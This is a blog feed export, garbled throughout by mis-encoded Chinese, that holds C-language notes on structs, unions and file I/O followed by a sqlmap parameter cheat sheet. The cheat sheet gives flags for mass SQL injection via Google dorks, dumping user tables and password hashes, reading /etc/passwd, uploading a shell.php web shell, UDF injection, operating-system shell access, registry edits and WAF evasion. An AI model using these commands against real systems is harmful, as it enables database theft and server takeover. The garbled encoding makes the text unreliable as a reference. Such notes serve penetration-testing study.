ä½†ç»“æ„ä½“å˜é‡å¯ä»¥ç›¸äº’èµ‹å€¼ //ç»“æ„ä½“å˜é‡å’Œç»“æ„ä½“å˜é‡æŒ‡é’ˆä½œä¸ºå‡½æ•°å‚æ•°ä¼ é€’çš„é—®é¢˜ //åŠ¨æ€æ„é€ ç»“æ„ä½“æ•°ç»„ //é“¾è¡¨ */ int num; struct student{ int num; char name[20]; char gender; int age; float score; char addr[30]; } ss={1,'xx','nan',20,99.9,'hhh'}; // sså°±æ˜¯å˜é‡ å¯ä»¥ç›´æ¥åœ¨è¿™é‡Œåˆå§‹åŒ– //èµ‹å€¼å’Œåˆå§‹åŒ– struct student ss2 = {2,'yy','bei',20,99.9,'zzz'}; struct student s = {100,'lala','M',20,99.5, 'beij'}; // ç»“æ„ä½“æ•°ç»„ struct student sArr[3]; for (int i = 0; i &lt; 3; i++) { scanf("%d%s %c%d%f%s", &amp;sArr[i].num, sArr[i].name, &amp;sArr[i].gender, &amp;sArr[i].age,&amp;sArr[i].score, &amp;sArr[i].addr); // %c å¿½ç•¥ç©ºæ ¼ } // ç»“æ„ä½“æŒ‡é’ˆ struct student *p = &amp;s; //æ³¨æ„æ˜¯&amp; //p = &amp;s; // è·å–æˆå‘˜ p->name; //ç¬¬ä¸€ç§æ–¹å¼(æŒ‡é’ˆå˜é‡->æˆå‘˜å˜é‡å,åœ¨è®¡ç®—æœºå†…éƒ¨ä¼šè¢«è½¬æ¢ä¸º(*æŒ‡é’ˆå˜é‡å).æˆå‘˜å) (*p).name; //ç¬¬äºŒç§æ–¹å¼ï¼Œä¸ s.name; ç­‰ä»· // p->nameçš„å«ä¹‰ï¼špæ‰€æŒ‡å‘çš„é‚£ä¸ªç»“æ„ä½“å˜é‡ä¸­çš„nameè¿™ä¸ªæˆå‘˜ num = p->num++; // num = p->num, num=p->num+1; //ä¼˜å…ˆçº§ // ç¬¬ä¸€æ—¶é—´å»æ‰++ num = p++->num; // æ²¡é—®é¢˜, num=p->num, p=p+1 //æµ®ç‚¹å‹é»˜è®¤åœ¨Cè¯­è¨€ä¸­æ˜¯doubleï¼Œå¦‚æœè¦å®šä¹‰æˆfloatï¼Œåˆ™åœ¨åé¢åŠ fæˆ–Fï¼Œ ä½†æ˜¯ä¸èƒ½å‡†ç¡®å­˜å‚¨ } /////////////////////////////////////////// struct Student{ int num; char name[20]; int age; }; // é€šè¿‡å‡½æ•°å®Œæˆå¯¹ç»“æ„ä½“å˜é‡çš„è¾“å…¥å’Œè¾“å‡º void struc_func() { struct Student st; InputStudent(&amp;st); //å¯¹ç»“æ„ä½“å˜é‡è¾“å…¥ OutputStudent(st); //å¯¹ç»“æ„ä½“å˜é‡è¾“å‡º OutputStudent2(&amp;st); //å¯¹ç»“æ„ä½“å˜é‡è¾“å‡º } void InputStudent(struct Student * pstu) //pstuåªå 4ä¸ªå­—èŠ‚ { (*pstu).num=1; strcpy(pstu->name, "xxx"); pstu->age=18; }; /* è¿™æ˜¯æ— æ³•æ”¹å˜ä¸»å‡½æ•°çš„å€¼çš„ void InputStudent(struct Student stu) { stu.num=1; strcpy(stu.name, "xxx"); stu.age=18; };*/ ////åº”è¯¥å‘é€å†…å®¹è¿˜æ˜¯ä¼ é€åœ°å€ï¼Ÿ //å¦‚æœä¼ é€’çš„æ˜¯å†…å®¹ï¼Œå†…å­˜æ¶ˆè€—å¤§ void OutputStudent(struct Student stu) { printf("%d, %s %d", stu.num,stu.name, stu.age); } // å¦‚æœä¼ é€’çš„æ˜¯åœ°å€ï¼Œå¯èƒ½ä¸å®‰å…¨ï¼Œä½†æ˜¯æé«˜äº†é€Ÿåº¦ï¼ŒèŠ‚çœäº†å†…å­˜ï¼ˆæ¨èè¿™ç§æ–¹æ³•ï¼‰ void OutputStudent2(struct Student *pstu) { printf("%d, %s %d", pstu->num,pstu->name, pstu->age); } /* ã€æŒ‡é’ˆä¼˜ç‚¹å¤§æ€»ç»“ï¼šã€‘ å¿«é€Ÿçš„ä¼ é€’æ•°æ®ï¼Œè¾ƒå°‘äº†å†…å­˜çš„æ¶ˆè€— ã€é‡ç‚¹ã€‘ ä½¿å‡½æ•°è¿”å›ä¸€ä¸ªä»¥ä¸Šçš„å€¼ ã€é‡ç‚¹ã€‘ èƒ½ç›´æ¥è®¿é—®ç¡¬ä»¶ èƒ½æ–¹ä¾¿çš„å¤„ç†å­—ç¬¦ä¸² **/ //å…±ç”¨ä½“ void test_union() { //å…±ç”¨ä½“ï¼šå¤§å°ç­‰äºæˆå‘˜ä¸­æœ€å¤§çš„é‚£ä¸ªå¤§å°ï¼ˆé€šå¸¸å’Œç»“æ„ä½“ä¸€èµ·ä½¿ç”¨ï¼‰ // union å…±ç”¨ä½“name // { // æˆå‘˜è¡¨åˆ— // } å˜é‡è¡¨åˆ—; union data{ int i; char c; float f; }u1; // å…±ç”¨ä½“çš„èµ·å§‹åœ°å€å’Œæ¯ä¸ªæˆå‘˜çš„èµ·å§‹åœ°å€æ˜¯ç›¸åŒçš„ // ä¸€ä¸ªæ—¶é—´å†…åªèƒ½å­˜å–ä¸€ä¸ªæˆå‘˜ union data d; // ç°åœ¨æœ€å¤§çš„å°±æ˜¯4 d.i = 4; d.c='A'; d.f = 99.9; } typedef//1) ä¸ºåŸºæœ¬æ•°æ®ç±»å‹å®šä¹‰æ–°çš„ç±»å‹å typedef double REAL; //2) ä¸ºè‡ªå®šä¹‰æ•°æ®ç±»å‹ï¼ˆç»“æ„ä½“ã€å…±ç”¨ä½“å’Œæšä¸¾ç±»å‹ï¼‰å®šä¹‰ç®€æ´çš„ç±»å‹åç§° typedef struct tagPoint { double x; double y; double z; } Point; /* å®é™…ä¸Šå®Œæˆäº†ä¸¤ä¸ªæ“ä½œï¼š 1ã€å®šä¹‰äº†ä¸€ä¸ªæ–°çš„ç»“æ„ç±»å‹ struct tagPoint { double x; double y; double z; } ; 2ã€ä½¿ç”¨ typedef ä¸ºè¿™ä¸ªæ–°çš„ç»“æ„èµ·äº†ä¸€ä¸ªåˆ«åï¼Œå« Point typedef struct tagPoint Point */ //3) ä¸ºæ•°ç»„å®šä¹‰ç®€æ´çš„ç±»å‹åç§° typedef char* PCHAR; PCHAR pa NULLäºŒè¿›åˆ¶å…¨éƒ¨ä¸º0çš„å«ä¹‰ï¼š 1.æ•°å€¼ä¸º0 2.å­—ç¬¦ä¸²ç»“æŸæ ‡è®°ç¬¦ '\0' 3.ç©ºæŒ‡é’ˆNULL NULLè¡¨ç¤ºç¼–å·ä¸º0çš„åœ°å€ NULLè¡¨ç¤ºçš„æ˜¯é›¶ï¼Œä¸æ˜¯æ•°å­—ï¼Œè€Œæ˜¯ä»£è¡¨å†…å­˜å•å…ƒçš„ç¼–å· è®¡ç®—æœºè§„å®šäº†ï¼Œä»¥é›¶ä¸ºç¼–å·çš„å­˜å‚¨å•å…ƒçš„å†…å­˜ä¸å¯è¯»ã€ä¸å¯å†™ æ–‡ä»¶//æ–‡ä»¶ void test_file() { # define N 20 FILE *fp; char c; char p; char ret; char buf[N] = {0}; // å…ˆåˆå§‹åŒ– // fp = fopen("file.txt", "r"); fp = fopen("D:\Desktop\1.txt", "r+"); // argv[1] æ˜¯ä¼ é€’çš„ç¬¬ä¸€ä¸ªå‚æ•° if(fp == NULL) // åˆ¤æ–­æ‰“å¼€æ˜¯å¦æˆåŠŸï¼Œ -> å¤±è´¥ { perror("fopen"); // å®šä½å‡½æ•°æ‰§è¡Œé”™è¯¯åŸå› ï¼ˆåªèƒ½å®šä½åˆšåˆšæ‰§è¡Œçš„ï¼‰ goto error; } // fgetc è¯»å–ï¼Œä¸€æ¬¡è¯»å–ä¸€ä¸ªå­—èŠ‚ while ((c = fgetc(fp)) != EOF) { printf("%c",c); } // fputs å†™å…¥ï¼Œä¸€æ¬¡å†™å…¥ä¸€ä¸ªå­—èŠ‚ p = 'H'; ret = fputc(p, fp); // printf(FILE *fp,const char *format, ...) å‡½æ•°æ¥å†™æŠŠä¸€ä¸ªå­—ç¬¦ä¸²å†™å…¥åˆ°æ–‡ä»¶ä¸­ fprintf(fp, "This is testing for fprintf...\n"); // fread: bufæ²¡æœ‰\0 ret = fread(buf, sizeof(char), N, fp); printf("%d, %s \n", ret, buf); // fwrite: strcpy(buf, "word"); ret = fwrite(buf, sizeof(char), strlen(buf), fp); // æ¸…ç©ºbuffer memset(buf,0,sizeof(buf)); // fseek fseek(fp, 0, SEEK_SET); // ç§»åŠ¨åˆ°å¼€å¤´ã€‚ SEEK_SET,åç§»é‡çš„èµ·å§‹ç‚¹:æ–‡ä»¶å¼€å§‹å¤„ fseek(fp, -12, SEEK_CUR); // å¾€å›åç§», ä¸ç£ç›˜ä¸Šå®é™…çš„å­—èŠ‚æ•°å¯¹åº”ã€‚ SEEK_CUT:æ–‡ä»¶å½“å‰ä½ç½® // SEEK_END,åç§»é‡çš„èµ·å§‹ç‚¹ï¼šSEEK_END // ftell è·å–æ–‡ä»¶è¯»å†™æŒ‡é’ˆçš„å½“å‰ä½ç½® long last = ftell(fp); fclose(fp); error: printf("error!!!"); // fclose(fp); // å…³é—­æ–‡ä»¶ } document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Cè¯­è¨€</category>
      </categories>
      <tags>
        <tag>Cè¯­è¨€</tag>
        <tag>çç¢å¤ä¹ </tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmapå‚æ•°ç®€ä»‹]]></title>
    <url>%2Fposts%2F53327%2F</url>
    <content type="text"><![CDATA[æ¦‚è¿° å®˜ç½‘ å…¶ä»–ç‰¹æ€§ï¼š æ•°æ®åº“ç›´æ¥è¿æ¥ -d, ä¸é€šè¿‡SQLæ³¨å…¥ï¼Œæ‰§è¡Œèº«ä»½è®¤è¯ä¿¡æ¯ï¼Œipï¼Œç«¯å£ ä¸BurpSuiteï¼ŒGoogleç»“åˆä½¿ç”¨ï¼Œæ”¯æŒæ”¿ç­–è¡¨ä½†æ˜¯é™å®šæµ‹è¯•ç›®æ ‡ æ”¯æŒBasic, Digest, BTLM, CA èº«ä»½è®¤è¯ dbç‰ˆæœ¬ï¼Œ ç”¨æˆ·ï¼Œæƒé™ï¼Œhashæšä¸¾å’Œå­—å…¸ç ´è§£ï¼Œæš´åŠ›ç ´è§£è¡¨åˆ—åç§° æ–‡ä»¶ä¸Šä¼ ä¸‹è½½ï¼ŒUDFï¼Œ å¯åŠ¨å¹¶æ‰§è¡Œå­˜å‚¨è¿‡ç¨‹ï¼Œæ“ä½œç³»ç»Ÿå‘½ä»¤æ‰§è¡Œï¼Œè®¿é—®winæ³¨å†Œè¡¨ ä¸w3afï¼Œ metasploité›†æˆç»“åˆä½¿ç”¨ï¼ŒåŸºäºæ•°æ®åº“æœåŠ¡è¿›ç¨‹ææƒå’Œä¸Šä¼ æ‰§è¡Œåé—¨ å‡çº§: # åœ¨çº¿æ›´æ–°sqlmap sqlmap --update # ç¦»çº¿å‡çº§ git pull å…¶ä»–å¸¸è¯†ï¼š # ç»“æœæ–‡ä»¶å¤¹ä½ç½® /.root/sqlmap/output # æ—¥å¿— .sqlmap # é…ç½®æ–‡ä»¶ è‡ªå·±æ‰¾ åŸºæœ¬å‚æ•°1. Target Getæ–¹æ³•ï¼š -u urlé“¾æ¥ # geté“¾æ¥ -f # æ£€æŸ¥DBMSçš„æŒ‡çº¹ä¿¡æ¯ -p user_name # æŒ‡å®šå­—æ®µå‚æ•° -m list.txt # æ‰«æurlåˆ—è¡¨æ–‡ä»¶ -g # googleæœç´¢,è‡ªåŠ¨å»googleæ‰¾åˆ°ç„¶åè‡ªåŠ¨æ³¨å…¥ \â€ æ˜¯è½¬ä¹‰å¼•å·ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š # ä¾‹å¦‚ï¼š sqlmap -g "inurl:\".php?id=1\" # ç»“æœæ–‡ä»¶å¤¹ä½ç½® /.root/sqlmap/output -- users # æœ‰å“ªäº›user --banner # banner ä¿¡æ¯ --dbs # æœ‰å“ªäº›åº“ --schema #å…ƒæ•°æ®(æŸ¥çš„æ˜¯informatin_schemaä¿¡æ¯ï¼Œå‰ææ˜¯æœ‰æƒé™) -a # æ‰€æœ‰çš„ -d â€œmysql://root:@192.168.20.10:3306/dvwaâ€ # è®©sqlmapä½œä¸ºå®¢æˆ·ç«¯é“¾æ¥æ•°æ®åº“ï¼ˆdvwaæ˜¯æ•°æ®åº“åç§°ï¼‰ Postæ–¹æ³•ï¼šå°±ä¸æ˜¯é€šè¿‡urlæ¥æ‰«æäº†ï¼Œè€Œæ˜¯bodyæ¥è¿›è¡Œæ‰«æ -r request.txt # ä½¿ç”¨httpè¯·æ±‚æ–‡ä»¶è¿›è¡Œæ³¨å…¥ï¼ˆburpsuiteæ‹¦æˆªçš„è¯·æ±‚æ•°æ®åŒ…å¤åˆ¶ä¿å­˜åˆ°æ–‡ä»¶, å­˜åœ¨æ³¨å…¥çš„ä½ç½®ç”¨*æ ‡å‡ºï¼‰ -l log.txt # ä½¿ç”¨burpsuite logæ–‡ä»¶ ï¼ˆä½¿ç”¨burpsuite:option-> Misc ->logging -> è¿™é‡Œé€‰æ‹©Proxy-> è¿™é‡Œé€‰æ‹©requests-> é€‰æ‹©logæ–‡ä»¶ä¿å­˜ä½ç½® ï¼‰ --force-ssl # æ”¯æŒHttpsï¼Œå³å¬è¿‡httpsæ¥è¿›è¡Œè¯·æ±‚ï¼Œæˆ–åœ¨urlåŸŸåå+443ç«¯å£ä¹Ÿå¯ä»¥ -c sqlmap.conf # æ‰«æé…ç½®æ–‡ä»¶ï¼ˆæŠŠæ‰«æé…ç½®å†™åˆ°é‡Œé¢ï¼ŒæŠŠå®ƒå¼•ç”¨å³å¯ï¼‰ # æŸ¥æ‰¾æ–‡ä»¶ dpokg -L # æ‰¾æœ‰å…³..çš„æ–‡ä»¶åŒ… dpokg -L sqlmap | grep sqlmap.conf 2. Request postè¯·æ±‚ --data="user=xx&amp;pswd=yy" # æ•°æ®ï¼ˆå¯¹äºpostè¯·æ±‚ï¼šé™¤äº†ä¿å­˜è¯·æ±‚å¤´çš„æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥è¿™æ ·dataåŠ å‚æ•°ï¼Œ ä¹Ÿæ”¯æŒgetæ–¹æ³•ï¼šå‚æ•°æ”¾--dataåé¢ï¼‰ --param-del=";" # å˜é‡åˆ†éš”ç¬¦(è‹¥å¤šä¸ªå˜é‡ä¸æ˜¯ä»¥&amp;åˆ†å‰²),å¦‚ï¼šå‚æ•°ä»¥åˆ†å·åˆ†å‰² --data="name=1;id=11" --param-del=";" --cookie "xxxxxxxxx" --level=2 # å¸¦ä¸Šcookieå¤´(level=2æ—¶æ‰ä¼šæ£€æŸ¥cookieæ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹) å‚æ•°: set-cookie / --drop-set-cookie æ˜¯å¦ä¸¢å¼ƒä¸Šä¸€ä¸ªcookie,ä½¿ç”¨æ–°çš„cookie #cookie ---> ç™»é™†åæ‰èƒ½è®¿é—®çš„é¡µé¢ --user-agent="xxxxxxxxxx" # æŒ‡å®šuaå¤´ --random-agent --level=3 # éšæœºuaå¤´å­—å…¸: /usr/share/sqlmap/txt/user-agents.txt, winä¸‹ï¼šsqlmap/data/txt/user-agents.txt #--level>=3 # æ‰ä¼šæ£€æŸ¥user-agentå¤´æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥ #app/waf/IPS/IDSè¿‡æ»¤å¼‚å¸¸çš„uaå¤´ï¼Œsqlmapä¼šæŠ¥é”™ --host "aaaaaaa" --level=5 # hostå¤´ --level=5 # æ‰ä¼šæ£€æŸ¥hostå¤´æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥(ä¸€èˆ¬ä¸å»ºè®®è®¾ç½®è¿™ä¹ˆé«˜) --referrer --level=3 # æ£€æŸ¥referrer --level >=3 # æ‰ä¼šæ£€æŸ¥referreræ˜¯å¦å­˜åœ¨sqlæ³¨å…¥ --headers="host:www.a.com\nUser-Agent:xps" # é¢å¤–çš„è‡ªå®šä¹‰çš„headersï¼ˆ\næ˜¯æ¢è¡Œï¼Œæ³¨æ„å¤§å°å†™ï¼‰ --headers="X-Forwarded-For:* " --dbs --batch --method=GET/POST # é™å®šè¯·æ±‚æ–¹æ³• åŸºäºhttpèº«ä»½è®¤è¯ ä¸‰ç§èº«ä»½è®¤è¯ç±»å‹ï¼š Basic Diagest NTLM --auth-type Basic --auth-cred "user:pass" # --auth-typeæŒ‡å®šèº«ä»½è®¤è¯ç±»å‹ï¼Œåé—¨æ˜¯è´¦å·å¯†ç  åŸºäºå®¢æˆ·ç«¯è¯ä¹¦çš„èº«ä»½è®¤è¯ : # ç”¨çš„å¾ˆå°‘ # ä¸‹é¢ä¸¤ç§å‚æ•°ä¸çŸ¥é“æ˜¯å“ªä¸ªäº†ï¼Œä½¿ç”¨çš„æ—¶å€™è‡ªå·±æŸ¥ä¸€ä¸‹ --auth-cert --auth-file="ca.PEM" #å«æœ‰ç§é’¥çš„PEMçš„è¯ä¹¦æ–‡ä»¶ http(s)ä»£ç†ä½¿ç”¨ä»£ç†é˜²æ­¢è¢«å°ç­‰ --proxy="http://127.0.0.1:8888" # æœ¬åœ°ç½‘ç»œçš„è¯ä¸éœ€è¦ä»£ç†è®¾ç½® --auth-cred "user:pass" # å¦‚æœéœ€è¦èº«ä»½è®¤è¯ --ignore-proxy # å¿½ç•¥ç³»ç»Ÿä»£ç†è®¾ç½®ï¼Œé€šå¸¸ç”¨æˆ·æ‰«ææœ¬åœ°ç½‘ç»œç›®æ ‡ï¼ˆç”¨äºå¯¹æœ¬åœ°/å†…å®¹ç›®æ ‡è¿›è¡Œæ‰«æçš„æ—¶å€™ï¼‰ è¶…æ—¶ --deplay="6" # æ¯æ¬¡è¯·æ±‚ä¹‹é—´å»¶è¿Ÿæ—¶é—´ï¼Œ å•ä½:s --timeout="10" # è¯·æ±‚è¶…æ—¶æ—¶é—´ï¼Œæµ®ç‚¹æ•°ï¼Œé»˜è®¤30s --retries="5" # è¿æ¥è¶…æ—¶é‡è¯•æ¬¡æ•°ï¼Œé»˜è®¤3æ¬¡ --randomsize="id" # é•¿åº¦ã€ç±»å‹ä¸åŸå§‹å€¼ä¿æŒä¸€è‡´çš„å‰æä¸‹ï¼ŒæŒ‡å®šæ¯æ¬¡è¯·æ±‚éšæœºå–å€¼ çš„å‚æ•°nameï¼ˆå¯¹idéšæœºå–å€¼,ä½†é•¿åº¦ä¸åŸå§‹æ˜¯ä¸€è‡´çš„ï¼‰ --scope # è¿‡æ»¤æ—¥å¿—(burpçš„requestæ—¥å¿—-->option,Logging,proxy,requests)å†…å®¹ï¼Œ é€šè¿‡æ­£åˆ™ç­›é€‰æ‰«æå¯¹è±¡ï¼› -l burp.log --scope="{www}?\.target\.{com|net|org}" --level=3 --safe-url / --safe-freq # æ£€æµ‹å’Œç›²æ³¨é˜¶æ®µä¼šäº§ç”Ÿå¤§é‡å¤±è´¥è¯·æ±‚ï¼ŒæœåŠ¡ç«¯å¯èƒ½å› æ­¤é”€æ¯sessionã€‚ #å› æ­¤ï¼šæ¯å‘é€ --safe-freqæ¬¡æ³¨å…¥è¯·æ±‚ä¹‹åï¼Œå‘é€ä¸€æ¬¡æ­£å¸¸çš„è¯·æ±‚ --skip-urlencode # è·³è¿‡urlç¼–ç (é»˜è®¤GETæ–¹æ³•ä¼šå¯¹å†…å®¹è¿›è¡Œç¼–ç ï¼ŒæŸäº›ç¼–ç äººå‘˜ä¸éµå®ˆç¼–ç è§„åˆ™æ²¡ç¼–ç ) --eval="import hashlib;hash=hashlib.md5(id).hexdigest()" # æ¯æ¬¡è¯·æ±‚ä¹‹å‰æ‰§è¡Œçš„pyä»£ç  / æ¯æ¬¡è¯·æ±‚æ›´æ”¹æˆ–è€…å¢åŠ æ–°çš„å‚æ•°å€¼ï¼ˆæ—¶é—´ä¾èµ–ã€‚å…¶ä»–å‚æ•°ä¾èµ–ï¼‰åé¢å€¼æ˜¯ä¾èµ–å‰é¢å€¼çš„ -u "id=1?hash=c4ca423dj8caf5d" --eval ="import hashlib;hash=hashlib.md5(id).hexdigest()" # æ¯”å¦‚åé¢å‚æ•°æ˜¯hashçš„ï¼Œæ¯æ¬¡éƒ½æŠŠidç¼–ç  ` 3. Detection é£é™©ç­‰çº§â€‹`bash â€“level # 1-5çº§ï¼ˆé»˜è®¤1ï¼‰ payloadæ–‡ä»¶xmlï¼š/usr/share/sqpmap/xml/payloadsï¼Œ winï¼šsqlmap\data\xml\payloads â€“risk # 1-4çº§(é»˜è®¤1/æ— å®³), riskå‡é«˜å¯èƒ½é€ æˆæ•°æ®è¢«ç¯¡æ”¹é£é™©(update),2ä¼šå¢åŠ äº‹ä»¶çš„æµ‹è¯•è¯­å¥ï¼Œ3ä¼šå¢åŠ ORè¯­å¥çš„sqlæ³¨å…¥æµ‹è¯• â€“string / â€“not-string / â€“regexp / â€“code / â€“text-only / â€“titles # é¡µé¢æ¯”è¾ƒï¼ŒåŸºäºboolçš„æ³¨å…¥ç›‘æµ‹ï¼Œä¾æ®è¿”å›é¡µé¢å†…å®¹çš„ç™¾å¹´ååˆ¤æ–­çœŸå‡é€»è¾‘ã€‚ä½†æœ‰äº›é¡µé¢éšç€æ—¶é—´é˜ˆå€¼å˜åŒ–ï¼Œæ­¤æ—¶éœ€è¦äººä¸ºæ‰§è¡Œæ ‡è¯†çœŸå‡çš„å­—ç¬¦ä¸² #### &lt;font color=red&gt;4. Optimization &lt;/font&gt; ä¼˜åŒ–æ€§èƒ½ç›¸å…³çš„å‚æ•° ```bash --predict-output # é¢„è®¾è¾“å‡ºã€‚æ ¹æ®æ£€æµ‹æ–¹æ³•ï¼Œæ¯”å¯¹è¿”å›å€¼å’Œç»Ÿè®¡è¡¨å†…å®¹ï¼Œä¸æ–­ç¼©å°ç›‘æµ‹èŒƒå›´ï¼›ç‰ˆæœ¬åï¼Œç”¨æˆ·åï¼Œå¯†ç ï¼ŒProvilegesï¼Œroleï¼Œdbåï¼Œè¡¨åï¼Œåˆ—åï¼› #ä¸--threadsä¸å…¼å®¹ï¼›ç»Ÿè®¡è¡¨ #è¿›è€Œç²¾ç¡®å®šä½æ˜¯ä»€ä¹ˆæ•°æ®åº“å’Œç‰ˆæœ¬ç­‰ï¼Œ /usr/share/sqlmap/txt/common-outputs.txt --keep-alive # ä½¿ç”¨é•¿è¿æ¥ï¼Œæ€§èƒ½å¥½ï¼Œä¸--proxyä¸å…¼å®¹ï¼Œ ä½†æ˜¯å¤§é‡é•¿è¿æ¥ä¼šä¸¥é‡å ç”¨æœåŠ¡å™¨èµ„æº --null-connection # åªè·å–ç›¸åº”é¡µé¢å¤§å°å€¼ï¼Œè€Œéå†…å®¹ï¼› ã€ç”¨äºç›²æ³¨åˆ¤æ–­ çœŸå‡ã€‘ï¼Œé™ä½ç½‘ç»œå¸¦å®½æ¶ˆè€—ï¼›ä¸--text-onlyå‚æ•°ä¸å…¼å®¹(åŸºäºé¡µé¢å†…å®¹æ¯”è¾ƒåˆ¤æ–­ çœŸå‡) --threads=10 # æœ€å¤§å¹¶å‘çº¿ç¨‹ï¼Œç›²æ³¨æ—¶æ¯ä¸ªçº¿ç¨‹è·å–ä¸€ä¸ªå­—ç¬¦ï¼ˆ7æ¬¡è¯·æ±‚ï¼‰ï¼Œè·å–å®Œæˆåçº¿ç¨‹ç»“æŸï¼›é»˜è®¤1ï¼Œå»ºè®®ä¸è¦å¤§äº10ï¼ˆå¯èƒ½ä¼šå½±å“ç«™ç‚¹æ€§èƒ½ï¼‰ -o # å¼€å¯å‰ä¸‰ä¸ªæ€§èƒ½å‚æ•°ï¼ˆé™¤äº†--threadsï¼‰ æŒ‡çº¹ä¿¡æ¯ # Figerprint -f / --figerprint / -b / --banner # dbmsæŒ‡çº¹ä¿¡æ¯ï¼› DBMSï¼Œæ“ä½œç³»ç»Ÿï¼Œæ¶æ„ï¼Œè¡¥ä¸ â€‹ 5. Enumeration æšä¸¾ --schema --batch --exclude-sysdbs # sschema:å…ƒæ•°æ®(ä½¿ç”¨é»˜è®¤é€‰é¡¹) -- batch:è‡ªåŠ¨æ‰§è¡Œ --count -a # --all -b # --banner --current-user --current-db --hostname # æœºå™¨çš„ä¸»å --is-dba --users # åˆ—å‡ºæ‰€æœ‰ç”¨æˆ· --passwords --privileges -U user_name # æŸ¥çœ‹ç”¨æˆ·çš„æƒé™ï¼ˆä¸åŠ -Uå°±æ˜¯æŸ¥å½“å‰ç”¨æˆ·ï¼‰ --roles --dbs # åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“ --tables --columns --schema # åˆ—å‡ºinformation_schemaä¿¡æ¯ --schema --exclude-sysdbs # Dumpæ•°æ®ï¼š --dump # è·å–è¡¨ä¸­çš„æ•°æ®ï¼ŒåŒ…æ‹¬åˆ— --stop --dump-all exclude-sysdbs # é™¤äº†ç³»ç»Ÿåº“,... -C # column -T glag_table -D dvwa -X -U # user --start 100 --stop 200 # æŒ‡å®šåˆ†æ®µ --stop --sql-query "select * from users" # åé¢åŠ è¦æ‰§è¡Œçš„sqlè¯­å¥ --exclude-sysdbs # é™¤å»ç³»ç»Ÿåº“ --pivot-column=P... # # æŒ‡å®šåº“è¡¨çš„åˆ— -D dvwa -T users --columns # dumpæ•°æ® -D dvwa -T users --dump æš´åŠ›ç ´è§£æ˜¯åŸºäºå­—å…¸çš„ # mysql &lt;5.0æ²¡æœ‰information_schemaåº“ ï¼Œ mysql>=5.0å¦‚æœæ— æƒè¯»å–... # access æ— æƒè¯»ç‰©MSysyObjectsåº“ --common-tables --common-columns # (Accessç³»ç»Ÿè¡¨æ— åˆ—ä¿¡æ¯) æ–‡ä»¶ç³»ç»Ÿ FILE SYSTEM: --file-read="/etc/passwd" # è¯»ç³»ç»Ÿæ–‡ä»¶ --file-write="shell.php" --file-dest"/temp/shell.php" # å†™,å‰é¢æ˜¯æºæ–‡ä»¶ï¼Œåé—¨æ˜¯è¦å†™å…¥åˆ°çš„æ–‡ä»¶ UDFæ³¨å…¥è¯¦ç»†çš„å»æŸ¥èµ„æ–™å§ UDF injection: (User Design Function) --udf-inject, --shared-lib # ç¼–è¯‘å…±äº«åº“åˆ›å»ºå¹¶ä¸Šä¼ åˆ°DB Serverï¼Œä»¥æ­¤ç”ŸæˆUDFå®ç°é«˜çº§æ³¨å…¥ã€‚ #Linuxï¼šshare object, windows:DLL æ“ä½œç³»ç»Ÿ OS: # mysql, postgresql: ä¸Šä¼ å…±äº«åº“å¹¶ç”Ÿæˆ sys-exec(), sys_eval()ä¸¤ä¸ªUDF # MSsqlï¼š xp_cmdshell å­˜å‚¨è¿‡ç¨‹(1.æœ‰å°±ç”¨ï¼Œ2.ç¦å°±å¯ï¼Œ3.æ²¡å°±å»º) --sql-shell --os-shell --os-cmd â€‹ 6. Miscelianeous: -z # å‚æ•°åŠ©è®°ç¬¦, --answer="extending=N" # è®©å‡ºç°æç¤ºçš„é€‰é¡¹éƒ½é€‰Yæˆ–N --check-waf # æ£€æµ‹WAF/IPS/IDS --hpp # ç»•è¿‡æ£€æµ‹WAF/IPS/IDSçš„æœ‰æ•ˆæ–¹æ³•ï¼›å°¤å…¶å¯¹ASP/IIS å’ŒASP.NET/IISæ£€æŸ¥ --identify # å½»åº•æ£€æŸ¥WAF/IPS/I -mobile # æ¨¡æ‹Ÿæ™ºèƒ½æ‰‹æœºè®¾å¤‡ --purge-output # æ¸…é™¤outputæ–‡ä»¶å¤¹ --smart # å½“æœ‰å¤§é‡æ£€æµ‹ç›®æ ‡çš„æ—¶å€™ï¼Œåªé€‰æ‹©åŸºäºé”™è¯¯çš„æ£€æµ‹ç»“æœ --wizard # å‘å¯¼æ–¹å¼ 7. General-s # sqliteä¼šè¯æ–‡ä»¶ä¿å­˜ä½ç½® -t # è®°å½•æµé‡æ–‡ä»¶ä¿å­˜ä½ç½® --charset=GBK # å¼ºåˆ¶å­—ç¬¦ç¼–ç  --crawl=3 # ä»èµ·å§‹ä½ç½®çˆ¬ç«™æ·±åº¦ --csv-del=";" # dumpæ•°æ®é»˜è®¤å­˜åœ¨äº","åˆ†å‰²çš„csvæ–‡ä»¶ä¸­ï¼Œå¯ä»¥æŒ‡å®šå…¶ä»–åˆ†éš”ç¬¦ --dbms-cred # æŒ‡å®šæ•°æ®åº“è´¦å· --flush-session # æ¸…ç©ºsession --force-ssl # è®©sqlmapçŸ¥é“è®¿é—®çš„æ˜¯httpsçš„ç½‘ç«™ --fresh-queries # å¿½ç•¥seeeionæŸ¥è¯¢ç»“æœ --hex -v 3 # dumpéASCIIå­—ç¬¦å†…å®¹æ—¶ï¼Œå°†å…¶ç¼–ç ä¸º16è¿›åˆ¶å½¢å¼ï¼Œæ”¶åˆ°åè§£ç è¿˜åŸ --output-dir="/tmp" --parse-errors # åˆ†æå’Œæ˜¾ç¤ºæ•°æ®åº“å†…å»ºä¿å­˜ä¿¡æ¯ --save # å°†å‘½ä»¤ä¿å­˜æˆé…ç½®æ–‡ä»¶ 8. Windows Registory winæ³¨å†Œè¡¨ # å‰ææ˜¯æœ‰æƒé™ --reg-read # è¯»å– --reg-add # æ·»åŠ  --reg-del --reg-key, --reg-value, --reg-data, --reg-type='' #..é”®çš„å€¼ç­‰äº... â€‹ 9. injectionæ³¨å…¥ -p "id,referrer" 